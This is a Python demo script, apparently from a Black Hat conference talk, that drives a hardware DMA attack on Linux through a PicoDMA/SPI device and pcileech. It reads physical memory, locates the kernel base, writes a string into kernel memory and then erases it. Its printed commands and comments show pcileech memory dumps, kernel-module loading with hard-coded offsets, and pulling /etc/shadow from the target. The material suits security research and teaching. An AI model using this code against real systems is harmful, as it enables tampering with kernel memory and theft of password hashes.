blackhat_logo = """

                                    .(&@@@@@&(.
                                 ,@@@@@@@@@@@@@@@,
                               ,@@@@@@@@@@@@@@@@@@@,
                              #@@@@@@,       ,@@@@@@#
                             /@@@@@@&         &@@@@@@/
                             @@@@&               &@@@@
                             @@@@@@&/         /&@@@@@@
                             @@@@@@@@*       *@@@@@@@@
                             *@@@@@@@         @@@@@@@*
  .****,           ,****.     /@@@%*           *%@@@/      ,*****              ,,,,,                                      .
  *@@@@%           %@@@@/                                  %@@@@&             .@@@@@                             @@@@@. ..*.
  *@@@@% ,#%%%*    %@@@@/    /%&&@@&&%/       *#&&@&&%(.   %@@@@&   .//////.  .@@@@@  *#%#/      ./%&&&&&%(,   **@@@@@/**
  *@@@@@@@@@@@@@@/ %@@@@/ ,@@@@@@&&@@@@@@. (@@@@@@@@@@@@@@ %@@@@& *@@@@@@,    .@@@@@@@@@@@@@@  (@@@@@@&&@@@@@&,@@@@@@@@@@
  *@@@@@,   /@@@@@*%@@@@/       ...,@@@@@%#@@@@@     #@@@@&%@@@@@@@@@@&       .@@@@@&. ,@@@@@(        ..*@@@@@,  @@@@@.
  *@@@@%     %@@@@#%@@@@/ @@@@@@@@@@@@@@@%&@@@@%           %@@@@@@@@@@@&      .@@@@@    #@@@@#,@@@@@@@@@@@@@@@,  @@@@@.
  *@@@@@%,.,&@@@@@.%@@@@/%@@@@@     @@@@@%*@@@@@%.  /@@@@@%%@@@@@&,@@@@@@/    .@@@@@    #@@@@#@@@@@%    ,@@@@@,  @@@@@*
  *@@@@@@@@@@@@@@  %@@@@/.@@@@@@@@@@@@@@@%  &@@@@@@@@@@@@* %@@@@&   &@@@@@@   .@@@@@    #@@@@#(@@@@@@@@@@@@@@@,  #@@@@@@@.
          .,,.               .,,.               ..,,.                                            .,,,,               ..

                                                                                                           .
                                    &        #   /))))))))        **           *%%%%%%%%%\  .#%%%%%%%.      #  .%%%%%%%%.
                                    &        #  #                #, &                    #  %        *.     #  %        *,
                                    &        #  *,,,,,,,,.     *&    //          ,,,,,,,*,  %        *,     #  *,,,,,,,,(,
                                    &        #            %   %&%%%%%%&&       *,           %        *,     #           *,
                                    /(((((((((  .(((((((((* .%          %.     *%%%%%%%%%/  .#%%%%%%%(      #  .%%%%%%%%(



"""

blackhat_mini_logo = "   :sdNMMMmh+.   .dMMN++++yMMNo``mMMd/    `ymMMo-MMNs:    `+hMMd`NMMMd`   :MMMMo -yo:-    `-/ss`"

import struct

from .dma import spi_dma
from .spi import test_spi
from .util import dump_hex_pretty
from .pcileech import KMD_Linux48KernelBaseSeek_FPGASearch

from . import status

def run_demo():
    dma = spi_dma()

    print(blackhat_logo)

    # pause here and fix fonts so folks can see
    a = input("fix font size (shift-cmd-+) and press enter to continue.")
    print('')

    # show basic system information
    status.print_system_info()
    a = input('')

    # show SPI pin config
    status.print_spi_configuration()
    a = input('')

    # check pcileech server
    status.print_pcileech_dma_server_status()
    a = input('')

    # test SPI
    input("press enter to test SPI connectivity with PicoDMA.")
    test_spi()
    print('')

    # basic DMA read
    basic_read_address = 1024 ** 3
    input("press enter to read 0x1000 bytes at 0x%x." % basic_read_address)
    res = dma.read_pa(basic_read_address, 0x1000)
    input("read %d bytes, press enter to dump first 0x%x bytes in hex." % (len(res), 512))
    dump_hex_pretty(res[:512])
    print('')

    # test kernel base find
    input("press enter to find linux 4.8+ kernel base address.")
    start_addr = 0x1000000
    end_addr =   0x2000000

    kernel_base_address = KMD_Linux48KernelBaseSeek_FPGASearch(dma, start_addr, end_addr, is_xen=False)
    if kernel_base_address:
        print("found kernel base!  0x%x." % kernel_base_address)

    # test kernel base read full page
    if not kernel_base_address:
        kernel_base_address = 0x1800000

    print('')
    input("press enter to read 0x1000 bytes at %x." % kernel_base_address)
    res = dma.read_pa(kernel_base_address, 0x1000)
    input("read %d bytes, press enter to dump first 0x%x bytes in hex." % (len(res), 512))
    dump_hex_pretty(res[:512])
    print('')

    # pcileech dmaread (show integration)
    print("demo pcileech integration.  In another terminal, run:")
    print('./pcileech dump -device rawtcp://192.168.88.253:9999 -min 0x1800000 -max 0x1801000 -out first_read.bin; read -p "Press enter to continue"; hexdump -C first_read.bin')
    input("press enter to continue.")

    # pcileech streaming reads
    print('')
    print("larger reads stream the data.  In another terminal, run:")
    print('./pcileech dump -device rawtcp://192.168.88.253:9999 -min 0x1800000 -max 0x1808000 -out second_read.bin')
    input("press enter to continue.")

    #  write kernel memory
    print('')
    input("press enter to read 0x1000 bytes at %x + 0x1000." % kernel_base_address)
    res = dma.read_pa(kernel_base_address + 0x1000, 0x1000)
    input("read %d bytes, press enter to dump first 0x%x bytes in hex." % (len(res), 256))
    dump_hex_pretty(res[:256])
    print('')

    input("press enter to write %d bytes into kernel." % len(blackhat_mini_logo))
    res = dma.write_pa(kernel_base_address + 0x1000, blackhat_mini_logo)
    input("wrote data, press enter to display memory contents:")
    res = dma.read_pa(kernel_base_address + 0x1000, 0x1000)
    dump_hex_pretty(res[:256])
    print('')

    input("cleaning up kernel.")
    res = dma.write_pa(kernel_base_address + 0x1000, bytearray(len(blackhat_mini_logo)))
    input("wrote data, press enter to display memory contents:")
    res = dma.read_pa(kernel_base_address + 0x1000, 0x1000)
    dump_hex_pretty(res[:256])
    print('')

    # manual demo

    # for the pcileech demo, we ran with kernel 4.8.0-58-generic with vt-d / ASLR disabled.
    # this gives us known offsets to speed up the demo and test a known good case.
    # a hacked version of pcileech lets us supply these offsets.
    # ./pcileech kmdload -device rawtcp://192.168.88.253:9999 -kmd LINUX_X64_48_OFFSETS -48offsets 1800000,d969ca,fffffff825969ca,fffffff81912900,d99f19,fffffff82599f19,fffffff81a32b60

    # if loading is successful, we can pull files from the device:
    #./pcileech lx64_filepull -device rawtcp://192.168.88.253:9999 -kmd 0x1a600000 -s /etc/shadow

    # with kaslr:
    # ./pcileech kmdload -device rawtcp://192.168.88.253:9999 -kmd LINUX_X64_48
    # this works (takes a few minutes, whereas we can generate these values on-device using fpga search much
    # more quickly) but pcileech doesn't seem to reliably found the base for 4.8.0-58. streams at 20 megs/sec in lab
    # more work for a future demo
